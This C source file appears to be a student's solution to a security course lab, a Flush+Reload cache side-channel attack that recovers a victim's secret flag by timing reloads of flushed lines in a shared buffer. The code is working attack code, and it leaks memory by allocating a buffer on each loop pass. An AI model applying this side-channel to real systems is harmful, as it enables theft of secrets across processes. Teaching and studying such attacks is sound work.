    #include <stdlib.h>
    #include <stdio.h>
    #include <stdint.h>
    #include <fcntl.h>
    #include <sys/stat.h>
    #include <sys/mman.h>
    #include <unistd.h>

    #include "util.h"

    // Processor
    #define LINE_SIZE 64
    #define L1_SIZE 49152
    #define L2_SIZE 2097152
    #define L3_SIZE 23592960
    #define BUFF_SIZE 4*L3_SIZE

    // Config
    #define RUNS 25
    #define CYCLES_TO_WAIT 1000
    #define VICTIM_FLAG_MAX 1024
    #define VICTIM_IDX_SPACING 128
    #define DRAM_ACCESS_LATENCY 250

    int main() {
        int flag = -1;
        uint8_t tmp = 0;

        // buf is shared between the attacker and the victim
        char *buf = allocate_shared_buffer();

        // [2.1] TODO: Put your capture-the-flag code here
        
        // Store measurements somewhere
        int possible_flags[VICTIM_FLAG_MAX] = { 0 };
        
        for (int i = 0; i < RUNS; i++) {
            for (int cur_flag = 0; cur_flag < VICTIM_FLAG_MAX; cur_flag++) {
                // Flush: Flush all the cache lines that might be accessed by the victim to DRAM using clflush. 
                //        Be careful with the aforementioned cache line granularity issue. Note that cache size != integer size.
                
                for (int cur_byte = 0; cur_byte < LINE_SIZE; cur_byte++) clflush((uint64_t)(buf + cur_flag*VICTIM_IDX_SPACING + cur_byte));

                // Wait: Wait a few hundred cycles for the victim to perform the flag-dependent memory load operations. 
                //       Don’t use the system-provided sleep function to do this – similar to printf, this function will trigger a system call, 
                //       potentially destroying cache states.

                // Repurpose the measurement func to do the waiting
                volatile uint8_t *tmp_buf = (uint8_t*) malloc(LINE_SIZE);
                CYCLES cycles_passed = 0;
                while (cycles_passed < CYCLES_TO_WAIT) cycles_passed += measure_one_block_access_time((uint64_t)tmp_buf);

                // Reload: Re-access all the cache lines in the Flush step and measure the access latency to each of them. 
                //         Use the threshold derived from Part 1 to decode the flag value.

                int latency = measure_one_block_access_time((uint64_t)(buf + cur_flag*VICTIM_IDX_SPACING));
                if (latency < DRAM_ACCESS_LATENCY) possible_flags[cur_flag]++;
            }
        }

        // Print results + figure out most likely flag
        printf("Possibilites:\n");
        int max = 0;
        for (int i = 0; i < VICTIM_FLAG_MAX; i++) {
            if (possible_flags[i] > 0) {
                if (possible_flags[i] > max) {
                    flag = i;
                    max = possible_flags[i];
                }
                
                printf("%d: %d\n", i, possible_flags[i]);
            }
        }

        printf("------------------\nFlag is likely: %d\n", flag);

        deallocate_shared_buffer(buf);      // clean up
        return 0;
    }
